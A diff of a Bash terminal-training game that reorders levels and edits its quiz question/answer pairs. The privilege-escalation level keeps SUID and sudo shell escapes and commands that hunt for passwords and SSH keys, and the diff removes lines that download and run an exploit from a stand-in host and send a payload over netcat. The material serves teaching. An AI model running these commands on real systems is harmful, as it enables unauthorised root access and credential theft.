@@ -117,11 +117,11 @@ declare -a BOSS_FLAVOR=(
 # Level names
 declare -a LEVEL_NAMES=(
   "First Steps" "Save Your Work" "Reading Files" "Basic Pipes" "Input & Transform"
-  "Error Handling" "Logic Gates" "Job Control" "Variables" "Special Variables"
-  "Test Conditions" "Subshells" "Pattern Matching" "Quoting" "Arrays"
-  "Process Control" "Regular Expressions" "Cron" "Daemons" "Privilege"
-  "Kernel" "Memory" "Zero Day" "Firewall" "Entropy"
-  "Singularity" "Void" "Omega" "ROOT"
+  "Error Handling" "Logic Gates" "Variables" "Special Variables" "Job Control"
+  "Test Conditions" "Core File Tools" "System Admin" "Multiplexers" "Text Search"
+  "File Finding" "Data Processing" "String & Arrays" "Control Flow" "Batch Ops"
+  "Advanced Regex" "Git" "Network Tools" "Network Scanning" "WiFi & RF"
+  "Hash Cracking" "Forensics" "Privilege Escalation" "ROOT"
 )
 
 # Boss splash screen
@@ -1081,10 +1081,6 @@ gen_level0() {
   questions+=("$(_phrase "List" "Show") files in current directory|ls|#output:~server.log")
   questions+=("List $(_phrase "all files" "files") including hidden|ls -a|#output:~\\.")
   questions+=("List files with $(_phrase "details" "permissions" "long format")|ls -l|#output:~^[-drwx]")
-  questions+=("List files sorted by time (newest first)|ls -lt|#output:~^[-drwx]")
-  questions+=("List files sorted by size (largest first)|ls -lS|#output:~^[-drwx]")
-  questions+=("Long listing with human-readable sizes (K/M/G)|ls -lh|#output:~^[-drwx]")
-  questions+=("List one file per line|ls -1|#output:~server.log")
   questions+=("List files in ${W}${dir}${C} directory|ls ${dir}|#output:*")
   questions+=("List ${W}${dir}${C} with details|ls -l ${dir}|#output:~^[-drwx]")
 
@@ -1104,6 +1100,10 @@ gen_level0() {
   questions+=("Go up one directory|cd ..|#output:*")
   questions+=("Go up two directories|cd ../..|#output:*")
   questions+=("Go to root directory|cd /|#output:*")
+
+  # mkdir
+  questions+=("Create directory ${W}${dir2}${C}|mkdir ${dir2}|#output:*")
+  questions+=("Create nested directories ${W}${dir}/${dir2}${C} (parents too)|mkdir -p ${dir}/${dir2}|#output:*")
 
   printf '%s\n' "${questions[@]}"
 }
@@ -1127,6 +1127,11 @@ gen_level1() {
   questions+=("Save whoami to ${W}${outfile}${C} - overwrite (use ${Y}>${C})|whoami > ${outfile}|#state:exists:${outfile}")
   questions+=("Append hostname to ${W}${log}${C} (use ${Y}>>${C})|hostname >> ${log}|#state:exists:${log}")
   questions+=("Create empty file ${W}${outfile2}${C} (use ${Y}touch${C})|touch ${outfile2}|#state:exists:${outfile2}")
+
+  # tee - write to file AND stdout
+  questions+=("Echo '${word}' to screen AND save to ${W}${txt}${C} (use ${Y}tee${C})|echo ${word} | tee ${txt}|#output:${word}")
+  questions+=("Echo '${word2}' and append to ${W}${log}${C} (use ${Y}tee -a${C})|echo ${word2} | tee -a ${log}|#output:${word2}")
+  questions+=("Run ls, show output AND save to ${W}${outfile}${C}|ls | tee ${outfile}|#output:~server.log")
 
   printf '%s\n' "${questions[@]}"
 }
@@ -1153,8 +1158,9 @@ gen_level2() {
   questions+=("Last 10 lines of ${W}${log}${C} (use ${Y}tail${C})|tail ${log}|tail -10 ${log}|tail -n 10 ${log}|#output:@10")
   questions+=("Last line only of ${W}${txt}${C} (use ${Y}tail${C})|tail -1 ${txt}|tail -n 1 ${txt}|#output:@1")
 
-  # tail -f (user figures out -f flag for "follow")
-  questions+=("Watch ${W}${log}${C} for new lines as they're added (use ${Y}tail${C})|tail -f ${log}|#text:")
+  # less - scrollable file viewer
+  questions+=("View ${W}${log}${C} with scrolling (use ${Y}less${C})|less ${log}|#text:")
+  questions+=("View ${W}${txt}${C} with line numbers in less|less -N ${txt}|#text:")
 
   printf '%s\n' "${questions[@]}"
 }
@@ -1216,6 +1222,11 @@ gen_level3() {
   questions+=("Show last ${n2} sorted lines of ${W}${cfg}${C}§sort ${cfg} | tail -${n2}§#output:@${n2}")
   questions+=("Find ${Y}${term1}${C} lines, then count them§grep ${term1} ${log} | wc -l§grep -c ${term1} ${log}§#output:~[0-9]+")
 
+  # xargs - build commands from input
+  questions+=("Echo each line of ${W}${txt}${C} as argument§cat ${txt} | xargs echo§#output:*")
+  questions+=("List files from ${W}${txt}${C} (one per line)§cat ${txt} | xargs ls§xargs ls < ${txt}§#output:*")
+  questions+=("Remove files listed in ${W}${txt}${C} (carefully!)§cat ${txt} | xargs rm§xargs rm < ${txt}§#text:")
+
   printf '%s\n' "${questions[@]}"
 }
 
@@ -1247,15 +1258,12 @@ gen_level4() {
   questions+=("Reverse ${Y}'${word}'${C} (use ${Y}<<<${C} with rev)|rev <<< '${word}'|rev <<< ${word}|#output:*")
   questions+=("Reverse ${Y}'${word2}'${C}|rev <<< '${word2}'|rev <<< ${word2}|#output:*")
 
-  # bc calculations
+  # bc calculations (one example)
   questions+=("Calculate ${Y}${num1}+${num2}${C} with bc|bc <<< '${num1}+${num2}'|bc <<< ${num1}+${num2}|#output:~$((num1+num2))")
-  questions+=("Calculate ${Y}${num3}-${num4}${C} with bc|bc <<< '${num3}-${num4}'|bc <<< ${num3}-${num4}|#output:~$((num3-num4))")
-  questions+=("Calculate ${Y}${num1}*${num2}${C} with bc|bc <<< '${num1}*${num2}'|bc <<< ${num1}*${num2}|#output:~$((num1*num2))")
 
   # cut with <<<
   questions+=("Extract home dir from ${Y}'root:x:0:0:root:/root:/bin/bash'${C}|cut -d: -f6 <<< 'root:x:0:0:root:/root:/bin/bash'|#output:~/root")
   questions+=("Get username from ${Y}'john:x:1000:1000:John:/home/john:/bin/bash'${C}|cut -d: -f1 <<< 'john:x:1000:1000:John:/home/john:/bin/bash'|#output:~john")
-  questions+=("Get shell from ${Y}'user:x:1000:1000:User:/home/user:/bin/zsh'${C}|cut -d: -f7 <<< 'user:x:1000:1000:User:/home/user:/bin/zsh'|#output:~/bin/zsh")
 
   # wc with <<<
   questions+=("Count words in ${Y}'${word} ${word2} test'${C}|wc -w <<< '${word} ${word2} test'|#output:~3")
@@ -1281,24 +1289,17 @@ gen_level5() {
   missing=$(_phrase old.log backup.txt archive.csv deleted.log)
   missing2=$(_phrase removed.txt gone.log lost.dat missing.cfg)
 
-  # 2> = stderr to file (hint at 2> since this level teaches error redirection)
+  # 2> = stderr to file
   questions+=("Save stderr from ${G}./${script}${C} to ${W}${errfile}${C} (use ${Y}2>${C})|./${script} 2> ${errfile}")
-  questions+=("Redirect ${G}./${script2}${C} errors to ${W}${errfile2}${C} (use ${Y}2>${C})|./${script2} 2> ${errfile2}")
   questions+=("${G}cat${C} ${W}${missing}${C}, save error to ${W}${errfile}${C} (use ${Y}2>${C})|cat ${missing} 2> ${errfile}|~^cat [^ ]+ 2> ?${errfile}$")
-  questions+=("${G}cat${C} ${W}${missing2}${C}, save error to ${W}${errfile2}${C} (use ${Y}2>${C})|cat ${missing2} 2> ${errfile2}|~^cat [^ ]+ 2> ?${errfile2}$")
 
   # 2> /dev/null = hide errors
   questions+=("Find ${Y}*.${ext}${C} files, hide errors (use ${Y}2> /dev/null${C})|find . -name '*.${ext}' 2> /dev/null|#output:*")
-  questions+=("Find ${Y}*.${ext2}${C} files, suppress errors (use ${Y}2> /dev/null${C})|find . -name '*.${ext2}' 2> /dev/null|#output:*")
   questions+=("Run ${G}./${script}${C} but hide errors (use ${Y}2> /dev/null${C})|./${script} 2> /dev/null")
-  questions+=("Run ${G}./${script2}${C} and discard stderr (use ${Y}2> /dev/null${C})|./${script2} 2> /dev/null")
-  questions+=("List /root hiding permission errors (use ${Y}2> /dev/null${C})|ls /root 2> /dev/null|#output:*")
 
   # &> = both stdout+stderr
   questions+=("Capture stdout+stderr from ${G}./${script}${C} to ${W}${outfile}${C} (use ${Y}&>${C})|./${script} &> ${outfile}|./${script} > ${outfile} 2>&1")
-  questions+=("Save all output from ${G}./${script2}${C} to ${W}${outfile2}${C} (use ${Y}&>${C})|./${script2} &> ${outfile2}|./${script2} > ${outfile2} 2>&1")
   questions+=("Run ${G}./${script}${C} completely silently (use ${Y}&> /dev/null${C})|./${script} &> /dev/null|./${script} > /dev/null 2>&1")
-  questions+=("Silence all output from ${G}./${script2}${C} (use ${Y}&> /dev/null${C})|./${script2} &> /dev/null|./${script2} > /dev/null 2>&1")
 
   # 2>&1 = merge stderr into stdout
   questions+=("Run ${G}./${script}${C}, search ALL output for 'error'§./${script} 2>&1 | grep -i error§~^\\./[^ ]+ 2>&1 \\| grep")
@@ -1332,15 +1333,12 @@ gen_level6() {
 
   # === PURE: Just && and || basics ===
   questions+=("Create ${W}${dir}${C} and cd into it (use ${Y}&&${C})|mkdir ${dir} && cd ${dir}")
-  questions+=("Make ${W}${dir2}${C} and cd into it (use ${Y}&&${C})|mkdir ${dir2} && cd ${dir2}")
   questions+=("Create ${W}${dir}${C} or echo '${msg}' if fails (use ${Y}||${C})§mkdir ${dir} || echo '${msg}'")
   questions+=("cd to ${W}${dir}${C}, create it if missing|cd ${dir} || mkdir ${dir}")
 
   # === COMPOUND: Uses cat (L2), head (L2), tail (L2) ===
   questions+=("If ${W}${txt}${C} exists, display it (use ${Y}&&${C})|test -f ${txt} && cat ${txt}|[[ -f ${txt} ]] && cat ${txt}")
   questions+=("If ${W}${log}${C} exists, show first ${n} lines|test -f ${log} && head -${n} ${log}|[[ -f ${log} ]] && head -${n} ${log}")
-  questions+=("If ${W}${log}${C} exists, show last ${n} lines|test -f ${log} && tail -${n} ${log}|[[ -f ${log} ]] && tail -${n} ${log}")
-  questions+=("${G}cat${C} missing.txt, or echo '${msg}' on failure§cat missing.txt || echo '${msg}'")
   questions+=("If ${W}${txt}${C} exists cat it, else echo '${msg}'§test -f ${txt} && cat ${txt} || echo '${msg}'§[[ -f ${txt} ]] && cat ${txt} || echo '${msg}'")
 
   # === COMPOUND: Uses grep (L3), pipes (L3) ===
@@ -1366,57 +1364,16 @@ gen_level6() {
   questions+=("If ${W}${txt}${C} exists, sort and save to sorted.txt§test -f ${txt} && sort ${txt} > sorted.txt")
   questions+=("Search ${Y}${term}${C} in ${W}${log}${C}, save matches or echo 'none'§grep ${term} ${log} > matches.txt || echo 'none'")
 
+  # === Semicolon: run commands sequentially regardless of exit status ===
+  questions+=("Run pwd, ls, date in sequence (use ${Y};${C})|pwd ; ls ; date")
+  questions+=("Create ${W}${dir}${C}, list it, show path (use ${Y};${C})|mkdir -p ${dir} ; ls ${dir} ; pwd")
+  questions+=("Echo 'start', run ${G}./${script}${C}, echo 'end' (use ${Y};${C})|echo start ; ./${script} ; echo end")
+
   printf '%s\n' "${questions[@]}"
 }
 
-# Level 7: Job Control (&, jobs, bg, fg)
+# Level 7: Variables & Substitution
 gen_level7() {
-  local questions=() n n2 n3 script script2 log outfile errfile txt term; _ctx
-  n=$((RANDOM % 90 + 10)); n2=$((RANDOM % 3 + 1)); n3=$((RANDOM % 60 + 30))
-  script=$(_pick SANDBOX_SCRIPTS); script2=$(_pick SANDBOX_SCRIPTS)
-  log=$(_pick SANDBOX_LOGS); txt=$(_pick SANDBOX_TXTS)
-  outfile=$(_phrase output.log results.txt run.log process.out)
-  errfile=$(_phrase errors.log err.txt debug.log)
-  term=$(_phrase ERROR WARN INFO)
-
-  # === PURE: Just & and job control basics ===
-  questions+=("Run sleep ${n} in background (use ${Y}&${C})|sleep ${n} &")
-  questions+=("Run ${W}${script}${C} in background (use ${Y}&${C})|./${script} &")
-  questions+=("$(_phrase "List" "Show" "View") background jobs|jobs")
-  questions+=("Bring job ${n2} to foreground|fg %${n2}|fg ${n2}")
-  questions+=("$(_phrase "Send" "Move" "Put") job ${n2} to background|bg %${n2}|bg ${n2}")
-  questions+=("Kill job ${n2}|kill %${n2}")
-  questions+=("$(_phrase "Wait for" "Wait until") all background jobs finish|wait")
-
-  # === COMPOUND: Uses redirection (L1, L5) ===
-  questions+=("Run ${W}${script}${C} in background, save stdout to ${W}${outfile}${C}|./${script} > ${outfile} &")
-  questions+=("Run ${W}${script2}${C} in background, capture all output|./${script2} &> ${outfile} &|./${script2} > ${outfile} 2>&1 &")
-  questions+=("Run ${W}${script}${C} in background, separate stdout and stderr|./${script} > ${outfile} 2> ${errfile} &")
-  questions+=("Run ${W}${script}${C} silently in background|./${script} &>/dev/null &|./${script} >/dev/null 2>&1 &")
-
-  # === COMPOUND: Uses && || (L6) ===
-  questions+=("Run ${W}${script}${C} in background and echo 'started'|./${script} & && echo started")
-  questions+=("Wait for all jobs, then echo 'done'|wait && echo done")
-  questions+=("Kill job ${n2}, echo 'killed' on success|kill %${n2} && echo killed")
-
-  # === COMPOUND: Uses cat/grep (L2, L3) with job control ===
-  questions+=("Run ${W}${script}${C} in background, later grep its output§./${script} > ${outfile} & ; sleep 1 ; grep ${term} ${outfile}")
-  questions+=("Tail ${W}${log}${C} in background|tail -f ${log} &")
-  questions+=("Run grep in background, save matches|grep ${term} ${log} > matches.txt &")
-
-  # === COMPOUND: Advanced job control ===
-  questions+=("Disown job ${n2} (detach from shell)|disown %${n2}")
-  questions+=("Kill job ${n2} with force (SIGKILL)|kill -9 %${n2}|kill -KILL %${n2}")
-  questions+=("Stop job ${n2} (SIGSTOP)|kill -STOP %${n2}|kill -19 %${n2}")
-  questions+=("Wait for job ${n2} specifically|wait %${n2}")
-  questions+=("Bring most recent job to foreground|fg|fg %")
-  questions+=("Continue stopped job in background|bg")
-
-  printf '%s\n' "${questions[@]}"
-}
-
-# Level 8: Variables & Substitution
-gen_level8() {
   local questions=() txt txt2 log cfg var var2 var3 val val2 term n; _ctx
   txt=$(_pick SANDBOX_TXTS); txt2=$(_pick SANDBOX_TXTS)
   log=$(_pick SANDBOX_LOGS); cfg=$(_pick SANDBOX_CFGS)
@@ -1467,11 +1424,17 @@ gen_level8() {
   questions+=("Store first ${n} lines of ${W}${log}${C}|${var}=\$(head -${n} ${log})")
   questions+=("Echo path: /home/\$USER|echo \"/home/\$USER\"")
 
+  # === export and unset ===
+  questions+=("Export ${var} for child processes|export ${var}|export ${var}=${val}")
+  questions+=("Set and export ${var2} in one command|export ${var2}='${val2}'")
+  questions+=("Remove variable ${var} (use ${Y}unset${C})|unset ${var}")
+  questions+=("Show all exported variables|export|env")
+
   printf '%s\n' "${questions[@]}"
 }
 
-# Level 9: Special Variables ($$, $?, $!)
-gen_level9() {
+# Level 8: Special Variables ($$, $?, $!)
+gen_level8() {
   local questions=() n n2 script log txt; _ctx
   n=$((RANDOM % 3 + 2)); n2=$((RANDOM % 4 + 3))
   script=$(_pick SANDBOX_SCRIPTS); log=$(_pick SANDBOX_LOGS); txt=$(_pick SANDBOX_TXTS)
@@ -1492,13 +1455,11 @@ gen_level9() {
   questions+=("Run command, echo 'success' if \$? is 0§ls && echo 'exit: '\$?")
   questions+=("Test if last command succeeded (exit 0)|[[ \$? -eq 0 ]] && echo success")
 
-  # === COMPOUND: Uses & (L7) with $! ===
-  questions+=("Run ${W}${script}${C} in background, save its PID§./${script} & ; echo \"PID: \$!\"")
-  questions+=("Start sleep in background, show PID|sleep 60 & ; echo \$!")
-  questions+=("Run in background and wait for it by PID§./${script} & pid=\$! ; wait \$pid")
+  # === COMPOUND: Uses variables (L7) with special vars ===
+  questions+=("Store exit status in variable, then check it§status=\$? ; [[ \$status -eq 0 ]] && echo ok")
+  questions+=("Store PID in variable for later use|mypid=\$\$")
 
   # === COMPOUND: Uses redirection (L1, L5) ===
-  questions+=("Save PID to file after starting background job§./${script} & ; echo \$! > pid.txt")
   questions+=("Log exit status after command§grep ${term} ${log} ; echo \$? >> status.log")
   questions+=("Print 'failed' to stderr using exit status check§ls /nonexistent 2>/dev/null ; [[ \$? -ne 0 ]] && echo failed >&2")
 
@@ -1511,6 +1472,56 @@ gen_level9() {
   # === COMPOUND: Using $RANDOM ===
   questions+=("Create file with random name|touch file_\$RANDOM.txt")
   questions+=("Pick random line from ${W}${txt}${C}§head -\$((RANDOM % \$(wc -l < ${txt}) + 1)) ${txt} | tail -1")
+
+  printf '%s\n' "${questions[@]}"
+}
+
+# Level 9: Job Control (&, jobs, bg, fg)
+gen_level9() {
+  local questions=() n n2 n3 script script2 log outfile errfile txt term; _ctx
+  n=$((RANDOM % 90 + 10)); n2=$((RANDOM % 3 + 1)); n3=$((RANDOM % 60 + 30))
+  script=$(_pick SANDBOX_SCRIPTS); script2=$(_pick SANDBOX_SCRIPTS)
+  log=$(_pick SANDBOX_LOGS); txt=$(_pick SANDBOX_TXTS)
+  outfile=$(_phrase output.log results.txt run.log process.out)
+  errfile=$(_phrase errors.log err.txt debug.log)
+  term=$(_phrase ERROR WARN INFO)
+
+  # === PURE: Just & and job control basics ===
+  questions+=("Run sleep ${n} in background (use ${Y}&${C})|sleep ${n} &")
+  questions+=("Run ${W}${script}${C} in background (use ${Y}&${C})|./${script} &")
+  questions+=("$(_phrase "List" "Show" "View") background jobs|jobs")
+  questions+=("Bring job ${n2} to foreground|fg %${n2}|fg ${n2}")
+  questions+=("$(_phrase "Send" "Move" "Put") job ${n2} to background|bg %${n2}|bg ${n2}")
+  questions+=("Kill job ${n2}|kill %${n2}")
+  questions+=("$(_phrase "Wait for" "Wait until") all background jobs finish|wait")
+
+  # === COMPOUND: Uses redirection (L1, L5) ===
+  questions+=("Run ${W}${script}${C} in background, save stdout to ${W}${outfile}${C}|./${script} > ${outfile} &")
+  questions+=("Run ${W}${script2}${C} in background, capture all output|./${script2} &> ${outfile} &|./${script2} > ${outfile} 2>&1 &")
+  questions+=("Run ${W}${script}${C} in background, separate stdout and stderr|./${script} > ${outfile} 2> ${errfile} &")
+  questions+=("Run ${W}${script}${C} silently in background|./${script} &>/dev/null &|./${script} >/dev/null 2>&1 &")
+
+  # === COMPOUND: Uses && || (L6) ===
+  questions+=("Run ${W}${script}${C} in background and echo 'started'|./${script} & && echo started")
+  questions+=("Wait for all jobs, then echo 'done'|wait && echo done")
+  questions+=("Kill job ${n2}, echo 'killed' on success|kill %${n2} && echo killed")
+
+  # === COMPOUND: Uses special vars (L8) with job control ===
+  questions+=("Run ${W}${script}${C} in background, save its PID§./${script} & ; echo \"PID: \$!\"")
+  questions+=("Start sleep in background, show PID|sleep 60 & ; echo \$!")
+  questions+=("Run in background and wait for it by PID§./${script} & pid=\$! ; wait \$pid")
+  questions+=("Save PID to file after starting background job§./${script} & ; echo \$! > pid.txt")
+
+  # === COMPOUND: Uses cat/grep (L2, L3) with job control ===
+  questions+=("Run ${W}${script}${C} in background, later grep its output§./${script} > ${outfile} & ; sleep 1 ; grep ${term} ${outfile}")
+  questions+=("Tail ${W}${log}${C} in background|tail -f ${log} &")
+  questions+=("Run grep in background, save matches|grep ${term} ${log} > matches.txt &")
+
+  # === COMPOUND: Advanced job control ===
+  questions+=("Disown job ${n2} (detach from shell)|disown %${n2}")
+  questions+=("Wait for job ${n2} specifically|wait %${n2}")
+  questions+=("Bring most recent job to foreground|fg|fg %")
+  questions+=("Continue stopped job in background|bg")
 
   printf '%s\n' "${questions[@]}"
 }
@@ -1571,7 +1582,7 @@ gen_level10() {
   printf '%s\n' "${questions[@]}"
 }
 
-# Level 11: Core File Tools (cat, ls, head, tail, cp, wc, du, tree)
+# Level 11: Core File Tools
 gen_level11() {
   local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx
   local perm1=$((RANDOM % 8))$((RANDOM % 8))$((RANDOM % 8))
@@ -1761,7 +1772,7 @@ gen_level15() {
   printf '%s\n' "${questions[@]}"
 }
 
-# Level 16: Data Processing (sort, uniq, cut, awk, ps, ss, ip)
+# Level 16: Data Processing
 gen_level16() {
   local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx
   local proc2=$(_pick PROCS) col2=$(_rnum 1 5) col3=$((col + 1)) chars=$(_rnum 10 80) thresh=$(_rnum 50 500)
@@ -1861,7 +1872,7 @@ gen_level16() {
   printf '%s\n' "${questions[@]}"
 }
 
-# Level 9: Batch Operations (find -exec, xargs, sed, systemctl, journalctl)
+# Level 19: Batch Operations
 gen_level19() {
   local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx
   local svc2=$(_pick SERVICES) parallel=$(_rnum 2 8) linenum=$(_rnum 1 20)
@@ -1954,7 +1965,7 @@ gen_level19() {
   printf '%s\n' "${questions[@]}"
 }
 
-# Level 12: Network Scanning (nmap)
+# Level 23: Network Scanning (nmap)
 gen_level23() {
   local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx
   port2=$((port + 1000))
@@ -2006,7 +2017,7 @@ gen_level23() {
   printf '%s\n' "${questions[@]}"
 }
 
-# Level 14: Hash Cracking & Encoding (hashcat, john, hydra)
+# Level 25: Hash Cracking
 gen_level25() {
   local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx
   local hidx=$((RANDOM % ${#HASHCAT_MODES[@]}))
@@ -2062,7 +2073,7 @@ gen_level25() {
   printf '%s\n' "${questions[@]}"
 }
 
-# Level 15: Forensics & Binary Analysis
+# Level 26: Forensics
 gen_level26() {
   local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx
 
@@ -2106,7 +2117,7 @@ gen_level26() {
   printf '%s\n' "${questions[@]}"
 }
 
-# Level 11: Network Tools (tshark, curl, wget, ssh, openssl, jq)
+# Level 22: Network Tools
 gen_level22() {
   local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx
 
@@ -2173,7 +2184,7 @@ gen_level22() {
   printf '%s\n' "${questions[@]}"
 }
 
-# Level 13: Local Network & RF (wifi, smb, netcat, masscan)
+# Level 24: WiFi & RF
 gen_level24() {
   local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx
 
@@ -2206,7 +2217,7 @@ gen_level24() {
   printf '%s\n' "${questions[@]}"
 }
 
-# Level 6: String Manipulation & Arrays
+# Level 17: String & Arrays
 gen_level17() {
   local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx
 
@@ -2280,7 +2291,7 @@ gen_level17() {
   printf '%s\n' "${questions[@]}"
 }
 
-# Level 7: Control Flow & Functions
+# Level 18: Control Flow & Functions
 gen_level18() {
   local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx
 
@@ -2353,7 +2364,7 @@ gen_level18() {
   printf '%s\n' "${questions[@]}"
 }
 
-# Level 17: Apocalypse Mode - Hardcore one-liners, recovery, survival
+# Level 28: ROOT (Apocalypse Mode)
 gen_level28() {
   local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx
 
@@ -2451,7 +2462,7 @@ gen_level28() {
   printf '%s\n' "${questions[@]}"
 }
 
-# Level 10: Git Operations
+# Level 21: Git
 gen_level21() {
   local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx
   local remote=$(_pick REMOTE_HOSTS)
@@ -2548,7 +2559,7 @@ gen_level21() {
   printf '%s\n' "${questions[@]}"
 }
 
-# Level 2: tmux & Screen
+# Level 13: Multiplexers (tmux & screen)
 gen_level13() {
   local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx
 
@@ -2633,71 +2644,41 @@ gen_level13() {
   printf '%s\n' "${questions[@]}"
 }
 
-# Level 16: Privilege Escalation
+# Level 27: Privilege Escalation
 gen_level27() {
   local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx
 
   # SUID/SGID enumeration
   questions+=("Find all SUID binaries|find / -perm -4000 -type f 2>/dev/null")
-  questions+=("Find all SGID binaries|find / -perm -2000 -type f 2>/dev/null")
   questions+=("Find SUID/SGID combined|find / -perm /6000 -type f 2>/dev/null")
-  questions+=("Find SUID owned by root|find / -user root -perm -4000 -type f 2>/dev/null")
-  questions+=("Find world-writable files|find / -perm -o+w -type f 2>/dev/null")
-  questions+=("Find world-writable dirs|find / -perm -o+w -type d 2>/dev/null")
   questions+=("Find files with capabilities|getcap -r / 2>/dev/null")
-  questions+=("Find writable files in PATH|find \$(echo \$PATH | tr ':' ' ') -writable 2>/dev/null")
 
   # User enumeration
-  questions+=("Show current user|whoami|id")
-  questions+=("Show user groups|groups|id -Gn")
-  questions+=("Show all users|cat /etc/passwd|getent passwd")
-  questions+=("Show users with login shells§grep -vE 'nologin|false' /etc/passwd")
+  questions+=("Show current user and groups|id")
   questions+=("Show sudoers rules|sudo -l")
   questions+=("Check sudo version (CVE check)|sudo --version")
-  questions+=("Show logged in users|who|w")
-  questions+=("Show last logins|last")
-  questions+=("Check if user in docker group|id | grep docker")
-  questions+=("Check if user in lxd group|id | grep lxd")
+  questions+=("Check if user in docker/lxd group|id | grep -E 'docker|lxd'")
 
   # System enumeration
-  questions+=("Show OS version|cat /etc/os-release|uname -a")
-  questions+=("Show kernel version|uname -r")
+  questions+=("Show OS and kernel version|uname -a")
   questions+=("Show running processes|ps aux")
-  questions+=("Show processes as tree|ps auxf|pstree")
   questions+=("Show network connections|ss -tlpn|netstat -tlpn")
-  questions+=("Show cron jobs for all users|cat /etc/crontab; ls -la /etc/cron.*")
-  questions+=("Show user crontab|crontab -l")
-  questions+=("Show systemd timers|systemctl list-timers")
+  questions+=("Show cron jobs|cat /etc/crontab; crontab -l")
   questions+=("Show mounted filesystems|mount|df -h")
-  questions+=("Show /etc/fstab|cat /etc/fstab")
 
   # Config file hunting
   questions+=("Find config files with passwords|grep -ri 'password' /etc/ 2>/dev/null")
   questions+=("Check .bash_history|cat ~/.bash_history")
   questions+=("Find SSH keys|find / -name 'id_rsa*' -o -name '*.pem' 2>/dev/null")
-  questions+=("Check environment variables|env|printenv")
-  questions+=("Find files modified recently|find / -mmin -10 -type f 2>/dev/null")
-  questions+=("Search for credentials in files§grep -rli 'password\\|secret\\|key' /home 2>/dev/null")
 
-  # GTFOBins-style exploits
+  # GTFOBins-style exploits (representative examples)
   questions+=("SUID find shell escape|find . -exec /bin/sh -p \\; -quit")
   questions+=("SUID vim shell escape|vim -c ':!/bin/sh'")
-  questions+=("SUID less shell escape|less /etc/passwd then !sh")
-  questions+=("SUID nmap interactive shell|nmap --interactive then !sh")
   questions+=("SUID python shell|python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'")
-  questions+=("SUID perl shell|perl -e 'exec \"/bin/sh\";'")
-  questions+=("SUID awk shell|awk 'BEGIN {system(\"/bin/sh\")}'")
-  questions+=("Sudo tar privesc|sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh")
-  questions+=("Sudo zip privesc|sudo zip /tmp/x.zip /etc/passwd -T --unzip-command='sh -c /bin/sh'")
-  questions+=("Sudo git privesc|sudo git -p help config then !/bin/sh")
   questions+=("Sudo env privesc|sudo env /bin/sh")
-  questions+=("Capabilities python|python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'")
 
   # Kernel exploits prep
-  questions+=("Download and compile exploit|wget https://exploit.com/exp.c && gcc exp.c -o exp && ./exp")
   questions+=("Check kernel exploits (searchsploit)|searchsploit linux kernel \$(uname -r)")
-  questions+=("Transfer exploit via base64|base64 exp | nc ${ip} ${port}")
-  questions+=("Receive and decode|nc -lvnp ${port} | base64 -d > exp && chmod +x exp")
 
   # Docker/LXD escape
   questions+=("Docker socket check|ls -la /var/run/docker.sock")
@@ -2724,7 +2705,7 @@ gen_level27() {
   printf '%s\n' "${questions[@]}"
 }
 
-# Level 8: Advanced Regex & Text Processing
+# Level 20: Advanced Regex
 gen_level20() {
   local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx
 
@@ -2813,7 +2794,7 @@ gen_level20() {
